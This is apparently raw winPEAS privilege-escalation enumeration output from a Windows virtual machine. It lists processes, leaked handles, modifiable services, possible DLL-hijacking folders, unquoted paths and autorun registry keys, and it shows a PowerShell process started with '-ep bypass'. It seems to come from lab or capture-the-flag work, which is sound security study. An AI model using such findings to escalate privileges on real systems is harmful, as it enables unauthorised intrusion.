    TextInputHost(8828)[C:\Windows\SystemApps\MicrosoftWindows.Client.CBS_cw5n1h2txyewy\TextInputHost.exe] -- POwn: r.andrews
    Command Line: "C:\Windows\SystemApps\MicrosoftWindows.Client.CBS_cw5n1h2txyewy\TextInputHost.exe" -ServerName:InputApp.AppXk0k6mrh4r2q0ct33a9wgbez0x7v9cz5y.mca
   =================================================================================================

    sihost(4124)[C:\Windows\system32\sihost.exe] -- POwn: r.andrews
    Command Line: sihost.exe
   =================================================================================================

    StartMenuExperienceHost(8060)[C:\Windows\SystemApps\Microsoft.Windows.StartMenuExperienceHost_cw5n1h2txyewy\StartMenuExperienceHost.exe] -- POwn: r.andrews
    Command Line: "C:\Windows\SystemApps\Microsoft.Windows.StartMenuExperienceHost_cw5n1h2txyewy\StartMenuExperienceHost.exe" -ServerName:App.AppXywbrabmsek0gm3tkwpr5kwzbs55tkqay.mca
   =================================================================================================

    winPEASx64(4848)[C:\Users\r.andrews\winPEASx64.exe] -- POwn: r.andrews -- isDotNet
    Permissions: r.andrews [Allow: AllAccess]
    Possible DLL Hijacking folder: C:\Users\r.andrews (r.andrews [Allow: AllAccess])
    Command Line: "C:\Users\r.andrews\winPEASx64.exe"
   =================================================================================================

    UserOOBEBroker(6636)[C:\Windows\System32\oobe\UserOOBEBroker.exe] -- POwn: r.andrews
    Command Line: C:\Windows\System32\oobe\UserOOBEBroker.exe -Embedding
   =================================================================================================

    svchost(7248)[C:\Windows\system32\svchost.exe] -- POwn: r.andrews
    Command Line: C:\Windows\system32\svchost.exe -k UnistackSvcGroup
   =================================================================================================

    dllhost(4796)[C:\Windows\system32\DllHost.exe] -- POwn: r.andrews
    Command Line: C:\Windows\system32\DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}
   =================================================================================================

    Notepad(1916)[C:\Program Files\WindowsApps\Microsoft.WindowsNotepad_11.2408.12.0_x64__8wekyb3d8bbwe\Notepad\Notepad.exe] -- POwn: r.andrews
    Command Line: "C:\Program Files\WindowsApps\Microsoft.WindowsNotepad_11.2408.12.0_x64__8wekyb3d8bbwe\Notepad\Notepad.exe" 
   =================================================================================================

    svchost(4352)[C:\Windows\system32\svchost.exe] -- POwn: r.andrews
    Command Line: C:\Windows\system32\svchost.exe -k UnistackSvcGroup -s CDPUserSvc
   =================================================================================================

    RuntimeBroker(7400)[C:\Windows\System32\RuntimeBroker.exe] -- POwn: r.andrews
    Command Line: C:\Windows\System32\RuntimeBroker.exe -Embedding
   =================================================================================================

    vmtoolsd(1292)[C:\Program Files\VMware\VMware Tools\vmtoolsd.exe] -- POwn: r.andrews
    Command Line: "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe" -n vmusr
   =================================================================================================

    svchost(7288)[C:\Windows\system32\svchost.exe] -- POwn: r.andrews
    Command Line: C:\Windows\system32\svchost.exe -k UdkSvcGroup -s UdkUserSvc
   =================================================================================================

    msedgewebview2(9004)[C:\Program Files (x86)\Microsoft\EdgeWebView\Application\100.0.1185.36\msedgewebview2.exe] -- POwn: r.andrews
    Command Line: "C:\Program Files (x86)\Microsoft\EdgeWebView\Application\100.0.1185.36\msedgewebview2.exe" --type=renderer --noerrdialogs --user-data-dir="C:\Users\r.andrews\AppData\Local\Packages\MicrosoftWindows.Client.WebExperience_cw5n1h2txyewy\LocalState\EBWebView" --webview-exe-name=Widgets.exe --webview-exe-version=524.24900.140.0 --embedded-browser-webview=1 --disable-client-side-phishing-detection --display-capture-permissions-policy-allowed --js-flags="--harmony-weak-refs-with-cleanup-some --expose-gc" --lang=en-US --device-scale-factor=1 --num-raster-threads=1 --renderer-client-id=5 --launch-time-ticks=1366500608 --mojo-platform-channel-handle=3220 --field-trial-handle=1976,i,4625114672856337207,10407072770365691567,131072 --enable-features=UseBackgroundNativeThreadPool,UseNativeThreadPool,msWebView2TreatAppSuspendAsDeviceSuspend /prefetch:1
   =================================================================================================

    Widgets(3404)[C:\Program Files\WindowsApps\MicrosoftWindows.Client.WebExperience_524.24900.130.0_x64__cw5n1h2txyewy\Dashboard\Widgets.exe] -- POwn: r.andrews
    Command Line: "C:\Program Files\WindowsApps\MicrosoftWindows.Client.WebExperience_524.24900.130.0_x64__cw5n1h2txyewy\Dashboard\Widgets.exe" -ServerName:Microsoft.Windows.DashboardServer
   =================================================================================================

    svchost(7640)[C:\Windows\system32\svchost.exe] -- POwn: r.andrews
    Command Line: C:\Windows\system32\svchost.exe -k ClipboardSvcGroup -p -s cbdhsvc
   =================================================================================================

    svchost(3964)[C:\Windows\system32\svchost.exe] -- POwn: r.andrews
    Command Line: C:\Windows\system32\svchost.exe -k UnistackSvcGroup -s WpnUserService
   =================================================================================================

    RuntimeBroker(8164)[C:\Windows\System32\RuntimeBroker.exe] -- POwn: r.andrews
    Command Line: C:\Windows\System32\RuntimeBroker.exe -Embedding
   =================================================================================================

    msedgewebview2(1460)[C:\Program Files (x86)\Microsoft\EdgeWebView\Application\100.0.1185.36\msedgewebview2.exe] -- POwn: r.andrews
    Command Line: "C:\Program Files (x86)\Microsoft\EdgeWebView\Application\100.0.1185.36\msedgewebview2.exe" --type=utility --utility-sub-type=storage.mojom.StorageService --lang=en-US --service-sandbox-type=utility --noerrdialogs --user-data-dir="C:\Users\r.andrews\AppData\Local\Packages\MicrosoftWindows.Client.WebExperience_cw5n1h2txyewy\LocalState\EBWebView" --webview-exe-name=Widgets.exe --webview-exe-version=524.24900.140.0 --embedded-browser-webview=1 --mojo-platform-channel-handle=2208 --field-trial-handle=1976,i,4625114672856337207,10407072770365691567,131072 --enable-features=UseBackgroundNativeThreadPool,UseNativeThreadPool,msWebView2TreatAppSuspendAsDeviceSuspend /prefetch:8
   =================================================================================================

    powershell(9116)[C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe] -- POwn: r.andrews
    Command Line: "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -ep bypass
   =================================================================================================

    ShellExperienceHost(8944)[C:\Windows\SystemApps\ShellExperienceHost_cw5n1h2txyewy\ShellExperienceHost.exe] -- POwn: r.andrews
    Command Line: "C:\Windows\SystemApps\ShellExperienceHost_cw5n1h2txyewy\ShellExperienceHost.exe" -ServerName:App.AppXtk181tbxbce2qsex02s8tw7hfxa9xb3t.mca
   =================================================================================================

    conhost(6776)[C:\Windows\system32\conhost.exe] -- POwn: r.andrews
    Command Line: \??\C:\Windows\system32\conhost.exe 0x4
   =================================================================================================

    dllhost(8556)[C:\Windows\system32\DllHost.exe] -- POwn: r.andrews
    Command Line: C:\Windows\system32\DllHost.exe /Processid:{973D20D7-562D-44B9-B70B-5A0F49CCDF3F}
   =================================================================================================

    SearchHost(8052)[C:\Windows\SystemApps\MicrosoftWindows.Client.CBS_cw5n1h2txyewy\SearchHost.exe] -- POwn: r.andrews
    Command Line: "C:\Windows\SystemApps\MicrosoftWindows.Client.CBS_cw5n1h2txyewy\SearchHost.exe" -ServerName:CortanaUI.AppXstmwaab17q5s3y22tp6apqz7a45vwv65.mca
   =================================================================================================

    msedgewebview2(5800)[C:\Program Files (x86)\Microsoft\EdgeWebView\Application\100.0.1185.36\msedgewebview2.exe] -- POwn: r.andrews
    Command Line: "C:\Program Files (x86)\Microsoft\EdgeWebView\Application\100.0.1185.36\msedgewebview2.exe" --type=crashpad-handler --user-data-dir=C:\Users\r.andrews\AppData\Local\Packages\MicrosoftWindows.Client.WebExperience_cw5n1h2txyewy\LocalState\EBWebView /prefetch:7 --monitor-self-annotation=ptype=crashpad-handler --database=C:\Users\r.andrews\AppData\Local\Packages\MicrosoftWindows.Client.WebExperience_cw5n1h2txyewy\LocalState\EBWebView\Crashpad --annotation=IsOfficialBuild=1 --annotation=channel= --annotation=chromium-version=100.0.4896.75 "--annotation=exe=C:\Program Files (x86)\Microsoft\EdgeWebView\Application\100.0.1185.36\msedgewebview2.exe" --annotation=plat=Win64 "--annotation=prod=Edge WebView2" --annotation=ver=100.0.1185.36 --initial-client-data=0x134,0x138,0x13c,0x110,0x148,0x7ff8f749d840,0x7ff8f749d850,0x7ff8f749d860
   =================================================================================================

    svchost(8084)[C:\Windows\system32\svchost.exe] -- POwn: r.andrews
    Command Line: C:\Windows\system32\svchost.exe -k LocalService -p -s NPSMSvc
   =================================================================================================

    taskhostw(6740)[C:\Windows\system32\taskhostw.exe] -- POwn: r.andrews
    Command Line: taskhostw.exe {222A245B-E637-4AE9-A93F-A59CA119A75E}
   =================================================================================================

    msedgewebview2(3752)[C:\Program Files (x86)\Microsoft\EdgeWebView\Application\100.0.1185.36\msedgewebview2.exe] -- POwn: r.andrews
    Command Line: "C:\Program Files (x86)\Microsoft\EdgeWebView\Application\100.0.1185.36\msedgewebview2.exe" --embedded-browser-webview=1 --webview-exe-name=Widgets.exe --webview-exe-version=524.24900.140.0 --user-data-dir="C:\Users\r.andrews\AppData\Local\Packages\MicrosoftWindows.Client.WebExperience_cw5n1h2txyewy\LocalState\EBWebView" --noerrdialogs --disk-cache-size=52428800 --edge-webview-is-background --enable-features=msWebView2TreatAppSuspendAsDeviceSuspend,UseNativeThreadPool,UseBackgroundNativeThreadPool --lang=en-US --mojo-named-platform-channel-pipe=3404.6896.6822827938938489019
   =================================================================================================

    OneDrive(9012)[C:\Users\r.andrews\AppData\Local\Microsoft\OneDrive\OneDrive.exe] -- POwn: r.andrews
    Permissions: r.andrews [Allow: AllAccess]
    Possible DLL Hijacking folder: C:\Users\r.andrews\AppData\Local\Microsoft\OneDrive (r.andrews [Allow: AllAccess])
    Command Line:  /setautostart /background
   =================================================================================================

    powershell(4236)[C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe] -- POwn: r.andrews
    Command Line: "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" 
   =================================================================================================

    msedgewebview2(4172)[C:\Program Files (x86)\Microsoft\EdgeWebView\Application\100.0.1185.36\msedgewebview2.exe] -- POwn: r.andrews
    Command Line: "C:\Program Files (x86)\Microsoft\EdgeWebView\Application\100.0.1185.36\msedgewebview2.exe" --type=utility --utility-sub-type=network.mojom.NetworkService --lang=en-US --service-sandbox-type=none --noerrdialogs --user-data-dir="C:\Users\r.andrews\AppData\Local\Packages\MicrosoftWindows.Client.WebExperience_cw5n1h2txyewy\LocalState\EBWebView" --webview-exe-name=Widgets.exe --webview-exe-version=524.24900.140.0 --embedded-browser-webview=1 --mojo-platform-channel-handle=1968 --field-trial-handle=1976,i,4625114672856337207,10407072770365691567,131072 --enable-features=UseBackgroundNativeThreadPool,UseNativeThreadPool,msWebView2TreatAppSuspendAsDeviceSuspend /prefetch:3
   =================================================================================================


╔══════════╣ Vulnerable Leaked Handlers
╚  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#leaked-handlers
╚ Getting Leaked Handlers, it might take some time...
[######----]  62% |4% /#---]  72% -5% \#--]  82% |8% /9% -#-]  90% \|/3% -                       Handle: 1652(file)
    Handle Owner: Pid is 4848(winPEASx64) with owner: r.andrews
    Reason: TakeOwnership
    File Path: \Windows\System32\en-US\MsCtfMonitor.dll.mui
    File Owner: NT SERVICE\TrustedInstaller
   =================================================================================================

    Handle: 2064(key)
    Handle Owner: Pid is 4848(winPEASx64) with owner: r.andrews
    Reason: AllAccess
    Registry: HKLM\software\microsoft\internet explorer\security
   =================================================================================================

    Handle: 2544(key)
    Handle Owner: Pid is 4848(winPEASx64) with owner: r.andrews
    Reason: TakeOwnership
    Registry: HKLM\system\controlset001\control\nls\sorting\ids
   =================================================================================================



════════════════════════════════════╣ Services Information ╠════════════════════════════════════

╔══════════╣ Interesting Services -non Microsoft-
╚ Check if you can overwrite some service binary or perform a DLL hijacking, also check for unquoted paths https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#services
    ssh-agent(OpenSSH Authentication Agent)[C:\Windows\System32\OpenSSH\ssh-agent.exe] - Disabled - Stopped
    Agent to hold private keys used for public key authentication.
   =================================================================================================

    VGAuthService(VMware, Inc. - VMware Alias Manager and Ticket Service)["C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe"] - Auto - Running
    Alias Manager and Ticket Service
   =================================================================================================

    vm3dservice(VMware, Inc. - VMware SVGA Helper Service)[C:\Windows\system32\vm3dservice.exe] - Auto - Running
    Helps VMware SVGA driver by collecting and conveying user mode information
   =================================================================================================

    VMTools(VMware, Inc. - VMware Tools)["C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"] - Auto - Running
    Provides support for synchronizing objects between the host and guest operating systems.
   =================================================================================================


╔══════════╣ Modifiable Services
╚ Check if you can modify any service https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#services
    LOOKS LIKE YOU CAN MODIFY OR START/STOP SOME SERVICE/s:
    RmSvc: GenericExecute (Start/Stop)
    wcncsvc: GenericExecute (Start/Stop)
    BcastDVRUserService_29ccec: GenericExecute (Start/Stop)
    ConsentUxUserSvc_29ccec: GenericExecute (Start/Stop)
    CredentialEnrollmentManagerUserSvc_29ccec: GenericExecute (Start/Stop)
    DeviceAssociationBrokerSvc_29ccec: GenericExecute (Start/Stop)
    DevicePickerUserSvc_29ccec: GenericExecute (Start/Stop)
    DevicesFlowUserSvc_29ccec: GenericExecute (Start/Stop)
    PimIndexMaintenanceSvc_29ccec: GenericExecute (Start/Stop)
    PrintWorkflowUserSvc_29ccec: GenericExecute (Start/Stop)
    UdkUserSvc_29ccec: GenericExecute (Start/Stop)
    UnistoreSvc_29ccec: GenericExecute (Start/Stop)
    UserDataSvc_29ccec: GenericExecute (Start/Stop)
    WpnUserService_29ccec: GenericExecute (Start/Stop)

╔══════════╣ Looking if you can modify any service registry
╚ Check if you can modify the registry of a service https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#services-registry-modify-permissions
    [-] Looks like you cannot change the registry of any service...

╔══════════╣ Checking write permissions in PATH folders (DLL Hijacking)
╚ Check for DLL Hijacking in PATH folders https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#dll-hijacking
    C:\Windows\system32
    C:\Windows
    C:\Windows\System32\Wbem
    C:\Windows\System32\WindowsPowerShell\v1.0\
    C:\Windows\System32\OpenSSH\


════════════════════════════════════╣ Applications Information ╠════════════════════════════════════

╔══════════╣ Current Active Window Application
  [X] Exception: Object reference not set to an instance of an object.

╔══════════╣ Installed Applications --Via Program Files/Uninstall registry--
╚ Check if you can modify installed software https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#applications
    C:\Program Files\Common Files
    C:\Program Files\desktop.ini
    C:\Program Files\Internet Explorer
    C:\Program Files\Microsoft
    C:\Program Files\Microsoft Update Health Tools
    C:\Program Files\ModifiableWindowsApps
    C:\Program Files\Uninstall Information
    C:\Program Files\VMware
    C:\Program Files\Windows Defender
    C:\Program Files\Windows Defender Advanced Threat Protection
    C:\Program Files\Windows Mail
    C:\Program Files\Windows Media Player
    C:\Program Files\Windows NT
    C:\Program Files\Windows Photo Viewer
    C:\Program Files\Windows Sidebar
    C:\Program Files\WindowsApps
    C:\Program Files\WindowsPowerShell
    C:\Windows\System32


╔══════════╣ Autorun Applications
╚ Check if you can modify other users AutoRuns binaries (Note that is normal that you can modify HKCU registry and binaries indicated there) https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries.html

    RegPath: HKLM\Software\Microsoft\Windows\CurrentVersion\Run
    Key: VMware User Process
    Folder: C:\Program Files\VMware\VMware Tools
    File: C:\Program Files\VMware\VMware Tools\vmtoolsd.exe -n vmusr (Unquoted and Space detected) - C:\
   =================================================================================================


    RegPath: HKCU\Software\Microsoft\Windows\CurrentVersion\Run
    RegPerms: r.andrews [Allow: FullControl]
    Key: OneDrive
    Folder: C:\Users\r.andrews\AppData\Local\Microsoft\OneDrive
    FolderPerms: r.andrews [Allow: AllAccess]
    File: C:\Users\r.andrews\AppData\Local\Microsoft\OneDrive\OneDrive.exe /background
    FilePerms: r.andrews [Allow: AllAccess]
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders
    Key: Common Startup
    Folder: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders
    Key: Common Startup
    Folder: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon
    Key: Userinit
    Folder: C:\Windows\system32
    File: C:\Windows\system32\userinit.exe,
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon
    Key: Shell
    Folder: None (PATH Injection)
    File: explorer.exe
   =================================================================================================


    RegPath: HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot
    Key: AlternateShell
    Folder: None (PATH Injection)
    File: cmd.exe
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Font Drivers
    Key: Adobe Type Manager
    Folder: None (PATH Injection)
    File: atmfd.dll
   =================================================================================================


    RegPath: HKLM\Software\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers
    Key: Adobe Type Manager
    Folder: None (PATH Injection)
    File: atmfd.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: aux
    Folder: None (PATH Injection)
    File: wdmaud.drv
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: midi
    Folder: None (PATH Injection)
    File: wdmaud.drv
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: midimapper
    Folder: None (PATH Injection)
    File: midimap.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: mixer
    Folder: None (PATH Injection)
    File: wdmaud.drv
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.imaadpcm
    Folder: None (PATH Injection)
    File: imaadp32.acm
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.msadpcm
    Folder: None (PATH Injection)
    File: msadp32.acm
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.msg711
    Folder: None (PATH Injection)
    File: msg711.acm
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.msgsm610
    Folder: None (PATH Injection)
    File: msgsm32.acm
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.i420
    Folder: None (PATH Injection)
    File: iyuv_32.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.iyuv
    Folder: None (PATH Injection)
    File: iyuv_32.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.mrle
    Folder: None (PATH Injection)
    File: msrle32.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.msvc
    Folder: None (PATH Injection)
    File: msvidc32.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.uyvy
    Folder: None (PATH Injection)
    File: msyuv.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.yuy2
    Folder: None (PATH Injection)
    File: msyuv.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.yvu9
    Folder: None (PATH Injection)
    File: tsbyuv.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.yvyu
    Folder: None (PATH Injection)
    File: msyuv.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: wave
    Folder: None (PATH Injection)
    File: wdmaud.drv
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: wavemapper
    Folder: None (PATH Injection)
    File: msacm32.drv
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.l3acm
    Folder: C:\Windows\System32
    File: C:\Windows\System32\l3codeca.acm
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: aux
    Folder: None (PATH Injection)
    File: wdmaud.drv
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: midi
    Folder: None (PATH Injection)
    File: wdmaud.drv
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: midimapper
    Folder: None (PATH Injection)
    File: midimap.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: mixer
    Folder: None (PATH Injection)
    File: wdmaud.drv
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.imaadpcm
    Folder: None (PATH Injection)
    File: imaadp32.acm
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.msadpcm
    Folder: None (PATH Injection)
    File: msadp32.acm
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.msg711
    Folder: None (PATH Injection)
    File: msg711.acm
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.msgsm610
    Folder: None (PATH Injection)
    File: msgsm32.acm
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.cvid
    Folder: None (PATH Injection)
    File: iccvid.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.i420
    Folder: None (PATH Injection)
    File: iyuv_32.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.iyuv
    Folder: None (PATH Injection)
    File: iyuv_32.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.mrle
    Folder: None (PATH Injection)
    File: msrle32.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.msvc
    Folder: None (PATH Injection)
    File: msvidc32.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.uyvy
    Folder: None (PATH Injection)
    File: msyuv.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.yuy2
    Folder: None (PATH Injection)
    File: msyuv.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.yvu9
    Folder: None (PATH Injection)
    File: tsbyuv.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.yvyu
    Folder: None (PATH Injection)
    File: msyuv.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: wave
    Folder: None (PATH Injection)
    File: wdmaud.drv
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: wavemapper
    Folder: None (PATH Injection)
    File: msacm32.drv
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: msacm.l3acm
    Folder: C:\Windows\SysWOW64
    File: C:\Windows\SysWOW64\l3codeca.acm
   =================================================================================================


    RegPath: HKLM\Software\Classes\htmlfile\shell\open\command
    Folder: C:\Program Files\Internet Explorer
    File: C:\Program Files\Internet Explorer\iexplore.exe %1 (Unquoted and Space detected) - C:\
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: *kernel32
    Folder: None (PATH Injection)
    File: kernel32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: _wow64cpu
    Folder: None (PATH Injection)
    File: wow64cpu.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: _wowarmhw
    Folder: None (PATH Injection)
    File: wowarmhw.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: _xtajit
    Folder: None (PATH Injection)
    File: xtajit.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: advapi32
    Folder: None (PATH Injection)
    File: advapi32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: clbcatq
    Folder: None (PATH Injection)
    File: clbcatq.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: combase
    Folder: None (PATH Injection)
    File: combase.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: COMDLG32
    Folder: None (PATH Injection)
    File: COMDLG32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: coml2
    Folder: None (PATH Injection)
    File: coml2.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: DifxApi
    Folder: None (PATH Injection)
    File: difxapi.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: gdi32
    Folder: None (PATH Injection)
    File: gdi32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: gdiplus
    Folder: None (PATH Injection)
    File: gdiplus.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: IMAGEHLP
    Folder: None (PATH Injection)
    File: IMAGEHLP.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: IMM32
    Folder: None (PATH Injection)
    File: IMM32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: MSCTF
    Folder: None (PATH Injection)
    File: MSCTF.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: MSVCRT
    Folder: None (PATH Injection)
    File: MSVCRT.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: NORMALIZ
    Folder: None (PATH Injection)
    File: NORMALIZ.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: NSI
    Folder: None (PATH Injection)
    File: NSI.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: ole32
    Folder: None (PATH Injection)
    File: ole32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: OLEAUT32
    Folder: None (PATH Injection)
    File: OLEAUT32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: PSAPI
    Folder: None (PATH Injection)
    File: PSAPI.DLL
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: rpcrt4
    Folder: None (PATH Injection)
    File: rpcrt4.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: sechost
    Folder: None (PATH Injection)
    File: sechost.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: Setupapi
    Folder: None (PATH Injection)
    File: Setupapi.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: SHCORE
    Folder: None (PATH Injection)
    File: SHCORE.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: SHELL32
    Folder: None (PATH Injection)
    File: SHELL32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: SHLWAPI
    Folder: None (PATH Injection)
    File: SHLWAPI.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: user32
    Folder: None (PATH Injection)
    File: user32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: WLDAP32
    Folder: None (PATH Injection)
    File: WLDAP32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: wow64
    Folder: None (PATH Injection)
    File: wow64.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: wow64base
    Folder: None (PATH Injection)
